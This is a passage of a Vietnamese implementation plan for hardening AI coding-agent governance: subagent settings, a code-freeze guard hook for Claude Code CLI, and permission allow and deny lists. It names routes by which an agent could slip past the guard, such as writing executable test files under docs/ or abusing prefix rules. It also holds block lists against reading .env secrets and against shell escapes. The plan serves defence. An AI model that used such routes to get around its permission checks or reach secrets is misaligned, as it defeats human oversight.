| `.agents/skills/add-model/SKILL.md`          | Kiểm tra tính chính xác của skill `add-model` vừa được bổ sung trong commit `d51f1d8`.                                                                       | Phát hiện dòng 12 và 28 của `.agents/skills/add-model/SKILL.md` thiếu tiền tố `src/` (`lib/core/modelRegistry.ts`), và dòng 37 trỏ tới file không tồn tại `lib/utils/config.ts`. Đưa vào kế hoạch sửa thành `src/lib/core/modelRegistry.ts` và `src/lib/utils/translations/{vi,en}.ts`.                                                                                                                                                                    |
| `.agents/skills/add-translation/SKILL.md`    | Đối chiếu kiến trúc đa ngôn ngữ thực tế khi cập nhật `.agents/rules/03-ui.md`, `.agents/rules/04-bilingual.md` và `.agents/skills/add-translation/SKILL.md`. | Xác nhận đường dẫn cấu hình ngôn ngữ chính xác là `src/lib/utils/translations/vi.ts`, `src/lib/utils/translations/en.ts`, và `src/lib/utils/translations/index.ts` (`[SRC]` `src/lib/utils/translations/index.ts:1-35`). Sửa cả `.agents/rules/04-bilingual.md:14` và `.agents/skills/add-translation/SKILL.md:12,25,31`.                                                                                                                                  |

---

### 3. Assumptions & Cross-Task Dependencies

#### 3.1. Giả Định Kỹ Thuật Đã Kiểm Chứng (Verified Assumptions)

1. **Hành vi nạp System Prompt, Kế thừa Project Rules & Cơ chế `model: pro` của Antigravity Subagents (`M1`, `M2`)**:
   - **Giả định**: Phần thân Markdown bên dưới YAML frontmatter của `.agents/agents/<name>/agent.md` được nạp làm system prompt của subagent đó (`[URL]` `https://antigravity.google/docs/subagents.md`), nên việc tự đọc lại `planner/agent.md` hay `reviewer/agent.md` ở Bước 0 là dư thừa. Tuy nhiên, để phòng thủ chiều sâu trước trường hợp custom subagent bỏ sót project rules (`discuss.ai.google.dev/t/.../172904`), Bước 0 của `@planner` vẫn giữ yêu cầu đọc `.agents/rules/02-quality.md`. Trường `model` trong YAML frontmatter chỉ nhận `inherit | flash | pro` và không tự chuyển đổi provider giữa Gemini và Claude (`antigravity-cli#1150`, `#1195`).
   - **Dẫn chứng**: `[URL]` `https://antigravity.google/docs/subagents.md`, `[URL]` `https://antigravity.google/docs/models.md`, `[URL]` `https://antigravity.google/changelog.md`.
2. **Cú pháp `trigger: glob` trong `.agents/rules/*.md` & Lưu ý khớp thư mục con (`M3`)**:
   - **Giả định**: Chuỗi `globs` cần khai báo tường minh cả mẫu cấp gốc lẫn mẫu đệ quy `**/*`: `globs: "*.ts, *.tsx, *.js, *.mjs, **/*.ts, **/*.tsx, **/*.js, **/*.mjs"` cho `01-coding.md` và `globs: "*.tsx, *.css, **/*.tsx, **/*.css"` cho `03-ui.md`, kết hợp với mục **Core Coding & Testing Invariants** trong `00-core.md` (`always_on`).
   - **Dẫn chứng**: `[URL]` `https://antigravity.google/docs/rules.md`.
3. **Đồng bộ Ranh giới Bảo mật giữa Antigravity và Claude Code CLI bằng `PreToolUse` Hook (`allow` ➔ no-output exit `0`, chặn ➔ `hookSpecificOutput`, `"onFailure": "block"`) + 4 Lớp Phòng Thủ (`BLK-02`..`BLK-04`, `MAJ-04`, `MAJ-05`, `MAJ-07`..`MAJ-10`, `MAJ-12`, `MIN-05`..`MIN-07`)**:
   - **Giả định**:
     - `.agents/hooks.json:9` gọi `node scripts/code-freeze-guard.js`, re-export từ `.agents/scripts/code-freeze-guard.js`. Nhánh kiểm tra `.agents/.plan-approved` tại `.agents/scripts/code-freeze-guard.js:176-191` sẽ bị **xóa bỏ hoàn toàn** khỏi `export function isPlanApproved()` (dùng `REPO_ROOT` tại dòng 33) để `docs/plans/*.md` là nguồn chân lý duy nhất (`MAJ-07`, `MAJ-09`).
     - Theo tài liệu chính thức `[URL]` `https://code.claude.com/docs/en/permissions` và `[URL]` `https://code.claude.com/docs/en/hooks`, tiến trình `claude -p` do `.agents/scripts/run-claude.ps1` khởi chạy sẽ được bảo vệ bởi **4 lớp phòng thủ chiều sâu (`BLK-03`, `BLK-04`, `MAJ-08`, `MAJ-10`, `MAJ-12`, `MIN-06`, `MIN-07`)**:
       1. **Lớp 1 (`PreToolUse` Hook qua `--settings` với `"onFailure": "block"` và `allow` ➔ no-output exit `0`)**: Truyền `--settings $claudeHookSettings` (có `"onFailure": "block"` — `MAJ-10`) vào `claude -p` để gắn trực tiếp `node .agents/scripts/code-freeze-guard.js` cho các công cụ `Write|Edit|MultiEdit|Bash|Read`. Hàm `formatHookOutput(result, rawPayload)` trong `code-freeze-guard.js` khi nhận diện payload của Claude Code CLI (`rawPayload?.hook_event_name === "PreToolUse"`): (a) nếu `result.decision === "allow"`, trả về **`null`** để `main()` **không in gì ra stdout và thoát với `exit 0`** (_"Exit code 0 with no output means the hook has no decision to report, so the tool call continues through the normal permission flow"_ — tránh hoàn toàn nguy cơ `"defer"` thoát mã `2` trong `-p` mode và không bao giờ bỏ qua `--allowedTools` / `dontAsk` — `BLK-04`, `MAJ-12`); (b) nếu `result.decision !== "allow"`, chỉ trả về đối tượng `{ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: root.permission_mode === "dontAsk" ? "deny" : "ask", ...(result.reason ? { permissionDecisionReason: result.reason } : {}) } }` (không spread `...result`, không có trường `decision` ở cấp gốc — `MAJ-10`). Nhờ đó, quyền thực tế của tiến trình Claude CLI là **phép giao (`intersection`)** chặt chẽ giữa `--allowedTools` và `decide()`, đồng thời kèm theo **End-to-End CLI Smoke Probe** ở Mục 9.3 (`MAJ-12`).
       2. **Lớp 2 (Giới hạn `.md` trên toàn bộ `UNFROZEN_PREFIXES` `docs/**`và`UNFROZEN_FILES`+`Edit(docs/plans/_.md)`)**: Thu hẹp quyền sửa file trong `run-claude.ps1`thành`Edit(docs/plans/_.md)`(thay vì`Edit(docs/plans/**)`) và chặn mọi thao tác ghi file không có đuôi `.md` trên **toàn bộ `UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES`\*\* ngay tại Gate 3 của `code-freeze-guard.js` (`!relative.toLowerCase().endsWith(".md")` — `BLK-04`), triệt tiêu hoàn toàn vector tạo file thực thi `docs/notes/x.test.mjs` hoặc `docs/plans/x.test.mjs` rồi chạy qua `vitest`/`eslint` ở cả 2 kênh.
       3. **Lớp 3 (Dấu cách tường minh trước `*` trong `$sharedAllowedBash`)**: Mọi rule tiền tố có tham số trong `$sharedAllowedBash` đều có dấu cách trước `*` (`Bash(git diff *)`, `Bash(git log *)`, `Bash(git show *)`, `Bash(git status *)`, `Bash(git blame *)`, `Bash(npm ls *)`, `Bash(node scripts/verify-docs.mjs *)`, `Bash(npm run test:run *)`), ngăn `Bash(git diff *)` khớp với `git difftool`.
       4. **Lớp 4 (Chặn cờ nạp code/config neo khoảng trắng cho `-c`/`-u`/`-i`, cờ ghi file, lệnh gọi đệ quy CLI & chặn đọc `.env*` secrets)**: Mở rộng `MUTATING_FLAGS` trong `code-freeze-guard.js` (neo `(?:^|\s)-(?:c|u|i)(?:\s|=|$)` để không chặn nhầm tên file như `batch-c.test.ts` — `MIN-07`) và `$sharedDisallowed` trong `run-claude.ps1` để chặn `--config`, `-c`, `--root`, `--dir`, `--globalSetup`, `--setupFiles`, `--extcmd`, `git difftool*`, `powershell *`, `pwsh *`, `claude *` (`MIN-06`), `--output`, `--outputFile`, `--fix`, `--write`, `-u`, `--update`, `--coverage`; đồng thời thêm `Read(.env*),Read(**/.env*)` vào `$sharedDisallowed` và chặn đọc `.env*` trong `decide()` của `code-freeze-guard.js` (`MAJ-08`).
   - **Dẫn chứng**: `[SRC]` `scripts/code-freeze-guard.js:1-7`, `[SRC]` `.agents/scripts/code-freeze-guard.js:33,39-40,50-72,176,462-467,634-720`, `[SRC]` `.agents/scripts/run-claude.ps1:140-195`, `[URL]` `https://antigravity.google/docs/hooks.md`, `[URL]` `https://code.claude.com/docs/en/permissions`, và `[URL]` `https://code.claude.com/docs/en/hooks`.
4. **Cơ chế kiểm tra cổng `[4/5]` và `[5/5]` của `scripts/verify-docs.mjs`**:
   - **Giả định**: Khi di chuyển 32 mục cũ (`<= 2026-10-15`, dòng 122–847) từ `docs/CHANGELOG.md` sang `docs/archive/CHANGELOG-legacy.md` và thêm 1 mục changelog mới của task này vào đầu `docs/CHANGELOG.md`, số lượng headings sẽ là `7` (current) + `106` (legacy) = **113** (`--expected-headings=113`), và dung lượng `docs/CHANGELOG.md` giảm từ `130,991 bytes` xuống `< 35,000 bytes`, vượt qua cả 5 cổng của `scripts/verify-docs.mjs`.
   - **Dẫn chứng**: `[SRC]` `scripts/verify-docs.mjs:197-302`.

#### 3.2. Quan Hệ Phụ Thuộc Chéo (Cross-Task Dependencies), Thứ Tự Triển Khai Bước 4 ↔ Bước 5 & Đóng Trạng Thái Kế Hoạch (`MAJ-06`, `MAJ-07`, `MAJ-11`, `MIN-04`)

- **Hiện trạng các file kế hoạch trong `docs/plans/` và tương tác giữa tiền tố ngày `2026-10-19` với `2026-10-23` (`MAJ-06`, `MAJ-11`)**:
  - Qua kiểm chứng trực tiếp `docs/plans/` và `git status --short`, hiện tại trong `docs/plans/` có **5 file kế hoạch** thuộc 2 nhóm tiền tố ngày:
    - **Nhóm tiền tố ngày `2026-10-19` (4 files)**:
      1. `docs/plans/2026-10-19-pstack-skills-and-fast-track-implementation-plan.md` (đã commit tại `82152ba`, Header dòng 4 đang là `- **Status**: Approved` và dòng cuối là `[PLAN_APPROVED]`).
      2. `docs/plans/2026-10-19-swap-planner-reviewer-workflow-implementation-plan.md` (đã commit tại `82152ba`, Header dòng 4 đang là `- **Status**: Approved` và dòng cuối là `[PLAN_APPROVED]`).
      3. `docs/plans/2026-10-19-vitest-upgrade-and-add-model-skill.md` (đã commit tại `d51f1d8`, Header dòng 4 đang là `- **Status**: Approved` và dòng cuối là `[PLAN_APPROVED]`).
      4. `docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md` (file kế hoạch hiện tại — giữ nguyên tên file lịch sử có tiền tố `2026-10-19-`).
    - **Nhóm tiền tố ngày `2026-10-23` (1 file untracked của task khác đang soạn dở)**: 5. `docs/plans/2026-10-23-strata-local-llm-implementation-plan.md` (untracked `??`, Header đang là `- **Status**: Ready for Review`).
  - **Tác động lên thứ tự triển khai Bước 4 và Bước 5 (`MAJ-11`)**:
    - Code `.agents/scripts/code-freeze-guard.js:193-201` **hiện hành** chọn kế hoạch theo `mtimeMs` mới nhất. Do đó, ngay khi file kế hoạch hiện tại (`2026-10-19-remake-agents-governance-v2-implementation-plan.md`) được Reviewer phê duyệt (`Approved` + `[PLAN_APPROVED]`), `mtimeMs` của nó là mới nhất nên guard hiện hành trả về `true` (mở khóa repo để sửa `.gitignore` và `scripts/verify-docs.mjs` ở Gate 8).
    - Ngược lại, ngay sau khi thay `isPlanApproved()` bằng thuật toán `evaluateLatestDateGroupPlans()`, hàm mới sẽ ưu tiên tiền tố ngày trên tên file (`2026-10-23` > `2026-10-19`). Nếu file untracked `2026-10-23-strata-local-llm-implementation-plan.md` (`Status: Ready for Review`) vẫn nằm trong `docs/plans/`, `isPlanApproved()` sẽ lập tức trả về `false`!
    - Vì vậy, tại Mục 7, kế hoạch **đảo thứ tự thực thi**: thực hiện **Bước 4** (cập nhật `.gitignore`, `scripts/verify-docs.mjs`, sửa doc drift và archive `docs/CHANGELOG.md`) **TRƯỚC** khi sửa `.agents/scripts/code-freeze-guard.js`; còn **Bước 5** (cập nhật `.agents/hooks.json`, `run-claude.ps1`, `code-freeze-guard.js`, `code-freeze-guard.test.ts` và đóng `Status: Completed` cho cả 4 kế hoạch ngày `2026-10-19`) được thực hiện **SAU CÙNG** (ngoài ra các file trong `.agents/**` và `code-freeze-guard.test.ts` vốn thuộc Gate 6/Gate 7 luôn hỏi `ask` độc lập với `planApproved`, còn `docs/plans/*.md` thuộc Gate 3 luôn `allow`).
    - Khi hoàn tất Bước 5 và chuyển cả 4 file kế hoạch `2026-10-19-*.md` sang `- **Status**: Completed`, `isPlanApproved()` tất định trả về **`false`** trong **cả 2 trường hợp**: (i) nếu `2026-10-23-strata-local-llm-implementation-plan.md` (`Ready for Review`) còn trong `docs/plans/`, nhóm mới nhất `2026-10-23` trả về `false` nhờ cơ chế fail-safe; (ii) nếu `2026-10-23-strata-local-llm-implementation-plan.md` được dời đi, nhóm mới nhất `2026-10-19` có cả 4 file đều `Completed` nên cũng trả về `false` (`MAJ-06`, `MAJ-11`).

---

### 4. Bảng Verified Versions (2026)

| Công nghệ / Thành phần                      | Phiên bản / Chuẩn                                                                                  | Nguồn kiểm chứng (`[SRC]` / `[URL]`)                                                                     | Ghi chú áp dụng                                                                                                                                                                                                                                                                                                                               |
| :------------------------------------------ | :------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Google Antigravity Platform & Changelog** | `v2.24.0` (15/10/2026)                                                                             | `[URL]` `https://antigravity.google/changelog.md`                                                        | Bổ sung `Claude Opus 5.5` / `Sonnet 5.5`, lệnh `/compact`, và lựa chọn model tier (`Flash Lite`, `Flash`, `Pro`) cho Automations; chứa bản vá kế thừa global/project rules cho custom agents.                                                                                                                                                 |
| **Google Antigravity Models Roster**        | Tháng 10/2026 (`Gemini 4 Argon` `***`, `Gemini 3.8 Flash`, `Claude Opus 5.5`, `Claude Sonnet 5.5`) | `[URL]` `https://antigravity.google/docs/models.md`                                                      | `Claude Opus 4.6`, `Claude Sonnet 4.6`, `GPT-OSS-120b` có chú thích `* Will be removed on November 2, 2026`. `Gemini 4 Argon` có chú thích `***` (_"Not available in Antigravity IDE. Available in the Antigravity App, Antigravity CLI, and IDE extensions"_).                                                                               |
| **Google Antigravity Subagents**            | Schema 2026 (`model: inherit \| flash \| pro`)                                                     | `[URL]` `https://antigravity.google/docs/subagents.md`                                                   | YAML frontmatter hợp lệ: `name`, `description`, `tools`, `model` (`inherit`, `flash`, `pro`), `subagent`. Lưu ý `model: pro` không tự đổi provider sang Claude (`antigravity-cli#1150`) và có thể bị override khi `invoke_subagent` truyền `Model: "inherit"` (`antigravity-cli#1195`).                                                       |
| **Google Antigravity Rules**                | Schema 2026 (`always_on`, `manual`, `model_decision`, `glob`)                                      | `[URL]` `https://antigravity.google/docs/rules.md`                                                       | Trần 24,000 bytes/file; ngân sách `always_on` toàn cục 20,000 tokens; `globs` phải đặt trong ngoặc kép nếu bắt đầu bằng `*` và cần khai báo cả `*.ext, **/*.ext` để khớp mọi thư mục con (`M3`).                                                                                                                                              |
| **Google Antigravity Hooks**                | Schema 2026 (`PreToolUse`, exit `0` JSON `allow`/`deny`/`ask`, exit `2` block)                     | `[URL]` `https://antigravity.google/docs/hooks.md`                                                       | Hỗ trợ regex `matcher` cho cả tên công cụ hiện hành và mới (`write_to_file\|replace_file_content\|multi_replace_file_content\|write_file\|edit_file\|run_command`). Payload stdin chỉ chứa `conversationId`, `toolCall`, `stepIdx`.                                                                                                           |
| **Claude Code CLI Permissions & Hooks**     | Schema 2026 (`--permission-mode dontAsk`, `--allowedTools`, `--disallowedTools`, `--settings`)     | `[URL]` `https://code.claude.com/docs/en/permissions`, `https://code.claude.com/docs/en/hooks`           | Kết hợp `PreToolUse` hook (`"onFailure": "block"`, khi `allow` thoát `exit 0` không in stdout, khi chặn xuất `hookSpecificOutput.permissionDecision: "deny" \| "ask"` không có trường `decision` cấp gốc) với `Edit(docs/plans/*.md)`, deny `Write` cho `reviewer`, và deny `Read(.env*)` (`BLK-03`, `BLK-04`, `MAJ-08`, `MAJ-10`, `MAJ-12`). |
| **Google Antigravity Skills**               | Schema 2026 (`.agents/skills/<name>/SKILL.md`)                                                     | `[URL]` `https://antigravity.google/docs/skills.md`                                                      | Progressive disclosure: chỉ nạp `name` + `description` lúc khởi động, nạp thân `SKILL.md` khi kích hoạt.                                                                                                                                                                                                                                      |
| **Vitest**                                  | `^4.1.12`                                                                                          | `[SRC]` `package.json:117`                                                                               | Chạy unit test cho `.agents/scripts/code-freeze-guard.test.ts`.                                                                                                                                                                                                                                                                               |
| **TypeScript**                              | `^5.9.3`                                                                                           | `[SRC]` `package.json:115`                                                                               | Kiểm tra `npm run type-check` (`tsc --noEmit`, bao gồm `// @ts-check` trên `.agents/scripts/code-freeze-guard.js`).                                                                                                                                                                                                                           |
| **ESLint**                                  | `^9.39.2`                                                                                          | `[SRC]` `package.json:101`                                                                               | Kiểm tra `npm run lint` (bao gồm `.agents/scripts/`).                                                                                                                                                                                                                                                                                         |
| **Node.js ES Modules (ESM)**                | `24.x`                                                                                             | `[SRC]` `package.json:120`, `.agents/scripts/code-freeze-guard.js:21-25`, `scripts/verify-docs.mjs:1-15` | Cả `.agents/scripts/code-freeze-guard.js`, `scripts/code-freeze-guard.js` và `scripts/verify-docs.mjs` đều sử dụng chuẩn **ES Modules (`import` / `export function`)**.                                                                                                                                                                       |

---

### 5. Files Cần Chỉnh Sửa / Tạo Mới

#### `[NEW]` Tạo Mới (2 files)

1. `.agents/skills/vikini-debug/SKILL.md` — Hợp nhất nội dung từ `.agents/workflows/debug.md` (`/debug`: quy trình 5 bước điều tra root-cause, 3-strike Circuit Breaker) và `.agents/workflows/post-fix.md` (`/post-fix`: chạy `npm run verify`, ghi `docs/lessons-learned.md`, cập nhật `docs/CHANGELOG.md`).
2. `.agents/skills/vikini-audit/SKILL.md` — Chuyển đổi nội dung từ `.agents/workflows/audit.md` (`/audit`: quy trình 5 bước kiểm toán kiến trúc, code discipline, UI tokens, bilingual, và báo cáo `[CRITICAL]`/`[WARNING]`/`[INFO]`).

#### `[DELETE]` Xóa Bỏ (3 files)

1. `.agents/workflows/debug.md` — Đã chuyển sang `.agents/skills/vikini-debug/SKILL.md`.
2. `.agents/workflows/post-fix.md` — Đã chuyển sang `.agents/skills/vikini-debug/SKILL.md`.
3. `.agents/workflows/audit.md` — Đã chuyển sang `.agents/skills/vikini-audit/SKILL.md`.

#### `[MODIFY]` Chỉnh Sửa (29 files)

1. `.agents/agents/planner/agent.md` — Sửa YAML frontmatter (`model: pro`, xóa `role:`); tại Bước 0 (dòng 30) bỏ yêu cầu tự đọc lại `.agents/agents/planner/agent.md` nhưng **GIỮ NGUYÊN** yêu cầu đọc `.agents/rules/02-quality.md` (`M2`), khảo sát mã nguồn liên quan và đọc `SKILL.md` theo Pre-Work Protocol; cập nhật `.agents/workflows/debug.md` (dòng 57) ➔ `.agents/skills/vikini-debug/SKILL.md`.
2. `.agents/agents/reviewer/agent.md` — Sửa YAML frontmatter (`model: pro`, xóa `role:`), xóa `write_to_file` khỏi `tools:`, bỏ tự đọc `reviewer/agent.md` ở Bước 0, xóa gợi ý `node -e` / `npx tsx -e` ở dòng 82, thu gọn nội dung xuống `< 7,500 chars` (giữ nguyên 100% quy tắc thẩm định S1–S6, Evidence Bar, Dual-Reviewer, và Approval Token).
3. `.agents/agents/qa/agent.md` — Sửa YAML frontmatter (`model: pro`, xóa `role:`); tại mục Cơ Chế Runtime Model & Fallback (dòng 131–137), xóa bỏ `claude-4.6-opus` và cập nhật hướng dẫn rõ ràng (`M1`): khuyến nghị User/PM chọn `Claude Opus 5.5 (thinking)` (hoặc `Gemini 4 Argon`) khi gọi `@qa` và bắt buộc `@qa` xuất nhãn `[QA_MODEL: <actual-session-model>]` phản ánh đúng model thực tế đang chạy.
4. `.agents/agents/reviewer/allowlist.md` — Xóa lệnh mẫu dùng pipe `| npx eslint --stdin` (dòng 19) và mục 3 `node -e` / `npx tsx -e` (dòng 22–25); bổ sung `node scripts/verify-docs.mjs` vào danh sách lệnh allowlist hợp lệ.
5. `.agents/agents/reviewer/evidence-bar.md` — Tại §4.5.1 (dòng 21): thay gợi ý `node -e` / `npx tsx -e` bằng chạy unit test co-located qua `npx vitest run <path>`. Tại §4.5.3 (dòng 47–51): phân biệt rõ công cụ kiểm chứng **Wiring & Baseline** (`npx eslint --print-config <path>`, `npx tsc --showConfig`, `npx tsc --noEmit`) với **Negative Probe** hợp lệ (thực thi test case âm tính trong `*.test.ts` qua `npx vitest run <path>`, hoặc bước Negative Probe tường minh trong Verification Plan / Test Contract).
6. `.agents/rules/00-core.md` — Làm rõ quy tắc Git (BANNED mutating vs ALLOWED read-only inspection) và bổ sung mục **Core Coding & Testing Invariants** (~1,000 chars).
7. `.agents/rules/01-coding.md` — Đổi YAML frontmatter từ `trigger: always_on` sang `trigger: glob` với `globs: "*.ts, *.tsx, *.js, *.mjs, **/*.ts, **/*.tsx, **/*.js, **/*.mjs"` (`M3`); tại dòng 93, đổi sang `(Gemini 4 Argon, Claude Opus 5.5, Claude Sonnet 5.5, Gemini 3.8 Flash)`.
8. `.agents/rules/02-quality.md` — Cập nhật toàn bộ 5 vị trí tham chiếu `.agents/workflows/` (dòng 19, 30, 41, 99, 140) sang `.agents/skills/{vikini-debug,vikini-audit}/SKILL.md`; tại dòng 108 (`MIN-03`), cập nhật thành `- Chuẩn API Route Architecture: .agents/skills/api-patterns/SKILL.md (Validate → Execute → Respond, await auth() + UnauthorizedError hoặc requireUser() tại /api/conversations/**, /api/files/**, /api/messages/**, /api/user-templates/**).` (không ghi cứng con số); thu gọn xuống `~6,500 chars` theo Ma Trận Bảo Toàn Quy Chuẩn (Mục 6.4).
9. `.agents/rules/03-ui.md` — Đổi YAML frontmatter từ `trigger: model_decision` sang `trigger: glob` với `globs: "*.tsx, *.css, **/*.tsx, **/*.css"` (`M3`); thêm 1 dòng tham chiếu ngắn ở cuối file trỏ sang `.agents/rules/04-bilingual.md` và `.agents/skills/add-translation/SKILL.md`.
10. `.agents/rules/04-bilingual.md` — Giữ nguyên làm Single Source of Truth cho quy chuẩn song ngữ và sửa đường dẫn dòng 14 từ `lib/utils/translations/` thành `src/lib/utils/translations/`.
11. `.agents/rules/05-plan-review.md` — Thu gọn văn bản xuống `~6,500 chars` theo Ma Trận Bảo Toàn Quy Chuẩn (Mục 6.4); tại §1.1 chấp nhận cả `replace_file_content` và `edit_file`; tại §3.1 bỏ `write_to_file` khỏi quyền của `@reviewer`; tại §3.2 ghi rõ `run-claude.ps1 -Role reviewer` gắn `PreToolUse` hook `code-freeze-guard.js` qua `--settings` (`"onFailure": "block"`), chỉ cấp quyền `Edit(docs/plans/*.md)` và thu hồi `Write` ở cấp độ tool; tại §5 bổ sung quy tắc `evaluateLatestDateGroupPlans` (chặn ngày tương lai xa, ưu tiên tiền tố ngày `YYYY-MM-DD` + `mtimeMs`, fail-safe khi có kế hoạch chờ duyệt cùng ngày), Single-Step Pre-Approved Plan Guard (`write_to_file`/`write_file`), và nghĩa vụ đóng `- **Status**: Completed` cho mọi kế hoạch đã xong.
12. `.agents/hooks.json` — Cập nhật `matcher` tại dòng 5 thành `"write_to_file|replace_file_content|multi_replace_file_content|write_file|edit_file|run_command"`.
13. `.agents/scripts/run-claude.ps1` — (`BLK-02`, `BLK-03`, `BLK-04`, `MAJ-04`, `MAJ-05`, `MAJ-08`, `MAJ-10`, `MIN-05`, `MIN-06`) Xóa bỏ `--dangerously-skip-permissions` tại dòng 153; thay bằng `--permission-mode dontAsk`, gắn trực tiếp `code-freeze-guard.js` làm `PreToolUse` hook qua `--settings $claudeHookSettings` (có `"onFailure": "block"` — `MAJ-10`), giới hạn quyền sửa file ở `Edit(docs/plans/*.md)` (thay vì `**`), thu hồi `Write` ở cấp độ tool cho `reviewer` (`MAJ-04`), thêm dấu cách trước `*` cho mọi rule tiền tố trong `$sharedAllowedBash` (`BLK-03`, `MAJ-05`), chặn `Read(.env*),Read(**/.env*)` (`MAJ-08`), chặn `Edit(src/**),Edit(.agents/**),Edit(scripts/**),Edit(supabase/**),Edit(tests/**)`, chặn `Bash(powershell *),Bash(pwsh *),Bash(claude *)` (`MIN-06`), chặn `Bash(git difftool*),Bash(* --config*),Bash(* -c *),Bash(* --root*),Bash(* --dir*),Bash(* --globalSetup*),Bash(* --setupFiles*),Bash(* --extcmd*)` (`BLK-03`) cùng các cờ ghi file (`BLK-02`) và git mutating; đồng thời kiểm tra `IsPathRooted($ArtifactFile)` (`exit 43`) và dùng `$resolvedArtifactFile` trong `Split-Path`/`New-Item`/`Copy-Item` (`MIN-05`).
14. `.agents/scripts/code-freeze-guard.js` — (`BLK-03`, `BLK-04`, `MAJ-07`..`MAJ-12`, `MIN-04`, `MIN-07`) **Xóa bỏ hoàn toàn nhánh đọc `.agents/.plan-approved`** tại dòng 176–191 trong `export function isPlanApproved()` (dùng `REPO_ROOT` — `MAJ-07`, `MAJ-09`); export 7 hàm thuần ESM (`hasApprovedPlanHeader`, `hasCompletedPlanHeader`, `hasApprovedPlanFooter`, `evaluatePlanApprovalContent`, `isSelfForgedPlanWrite`, `evaluateLatestDateGroupPlans`, `formatHookOutput`); mở rộng `MUTATING_FLAGS` với ranh giới khoảng trắng cho `-c`/`-u`/`-i` (`BLK-03`, `MIN-07`); trong `decide()`, chặn đọc `.env*` secrets khi `toolName` là `Read`/`read_file`/`view_file` (`MAJ-08`), chặn ghi file không phải `.md` trên toàn bộ `UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES` (`!relative.toLowerCase().endsWith(".md")` — `BLK-04`), và thêm Single-Step Pre-Approved Plan Guard tại Gate 3; cập nhật `extractInput(payload)` hỗ trợ `write_file`/`edit_file` và `new_string`/`old_string` của Claude CLI `Edit`; cập nhật `formatHookOutput(result, rawPayload)` trả về **`null`** khi `hook_event_name === "PreToolUse"` và `result.decision === "allow"` (để `main()` không in gì ra stdout và exit 0 — `MAJ-12`) và trả về `{ hookSpecificOutput }` không spread `...result` khi chặn (`MAJ-10`).
15. `.agents/scripts/code-freeze-guard.test.ts` — Bổ sung bộ unit test kiểm chứng toàn diện các hàm mới và các kịch bản tấn công (`TC-01`..`TC-08`, bao gồm `TC-02(g)` cho nhóm ngày mới hơn `2026-10-23` có plan `Ready for Review` — `MAJ-11`, `TC-04(c)` cho `docs/notes/x.test.mjs` — `BLK-04`, `TC-05(c),(e)` cho `formatHookOutput` trả `null` khi `allow` và không có trường `decision` cấp gốc khi chặn — `MAJ-10`, `MAJ-12`, `TC-06` cho `batch-c.test.ts` — `MIN-07`; giữ nguyên test tích hợp `isPlanApproved()` tại dòng 595–598 — `MAJ-09`, tổng `>= 119 tests`).
16. `.agents/scripts/claude-planner-prompt.md` — Cập nhật dòng 20 (bổ sung `add-model`, `vikini-debug`, `vikini-audit`) và dòng 64 (`.agents/workflows/debug.md` ➔ `.agents/skills/vikini-debug/SKILL.md`).
17. `.agents/skills/add-model/SKILL.md` — Sửa dòng 12 và dòng 28 từ `lib/core/modelRegistry.ts` thành `src/lib/core/modelRegistry.ts`; sửa dòng 37 từ `lib/utils/config.ts` thành `src/lib/utils/translations/vi.ts` và `src/lib/utils/translations/en.ts`.
18. `.agents/skills/add-translation/SKILL.md` — Sửa dòng 12, 25, 31 từ `lib/utils/translations/` thành `src/lib/utils/translations/`.
19. `.agents/skills/README.md` — Bổ sung `vikini-debug` và `vikini-audit` vào mục 1.C và bảng định tuyến mục 2; cập nhật dòng 17 và 47 phản ánh cả `await auth()` + `UnauthorizedError` và `requireUser()` (tại `/api/conversations/**`, `/api/files/**`, `/api/messages/**`, `/api/user-templates/**`, không ghi cứng số lượng route — `MIN-03`).
20. `.agents/README.md` — Cập nhật bảng Rules Catalog (Mục 2), bổ sung dòng `@qa` vào bảng Model Routing (Mục 4.1) kèm giải thích rõ cơ chế `model: pro` (`M1`) và đồng bộ danh mục 4 model tháng 10/2026 (`gemini-4-argon` kèm lưu ý `***`, `claude-opus-5-5`, `claude-sonnet-5-5`, `gemini-3.8-flash`).
21. `.gitignore` — (`MAJ-07`, `Minor 6`) Chỉ bổ sung `!.agents/skills/vikini-debug/` và `!.agents/skills/vikini-audit/` (không unignore 3 third-party skills và **không** thêm `.agents/.plan-approved` vào `.gitignore`).
22. `scripts/verify-docs.mjs` — Cập nhật kiểm tra `[2/5]` để phát hiện mọi tham chiếu sót tới `.agents/workflows/` (loại trừ `docs/plans/`, `docs/archive/`, `docs/CHANGELOG.md`) và loại bỏ tiền tố `.agents/workflows/` khỏi điều kiện quét của `[3/5]`.
23. `docs/lessons-learned.md` — Cập nhật dòng 5 từ `/post-fix workflow` sang skill `vikini-debug` (`/post-fix`).
24. `docs/CHANGELOG.md` — Cập nhật dòng ghi chú lưu trữ tại dòng 7 thành **"từ ngày `2026-10-15` trở về trước (`<= 2026-10-15`)"**, di chuyển 32 mục changelog cũ (`<= 2026-10-15`, dòng 122–847) sang `docs/archive/CHANGELOG-legacy.md`, và ghi mục changelog mới cho Vikini Governance 2.0 vào đầu file.
25. `docs/archive/CHANGELOG-legacy.md` — Cập nhật dòng ghi chú lưu trữ tại dòng 3 thành **"từ ngày `2026-10-15` trở về trước (`<= 2026-10-15`)"** và nhận 32 mục changelog cũ (`<= 2026-10-15`) từ `docs/CHANGELOG.md`.
26. `docs/plans/README.md` — Cập nhật bảng danh mục kế hoạch với trạng thái `Completed` cho đầy đủ cả 4 kế hoạch ngày `2026-10-19` (`pstack-skills-and-fast-track`, `swap-planner-reviewer-workflow`, `vitest-upgrade-and-add-model-skill`, và `remake-agents-governance-v2` — `MAJ-06`).
27. `docs/plans/2026-10-19-pstack-skills-and-fast-track-implementation-plan.md` — (`MAJ-06`) Cập nhật dòng trạng thái ở Header (dòng 4) từ `- **Status**: Approved` sang `- **Status**: Completed` ở bước cuối cùng của quá trình triển khai.
28. `docs/plans/2026-10-19-swap-planner-reviewer-workflow-implementation-plan.md` — (`MAJ-06`) Cập nhật dòng trạng thái ở Header (dòng 4) từ `- **Status**: Approved` sang `- **Status**: Completed` ở bước cuối cùng của quá trình triển khai.
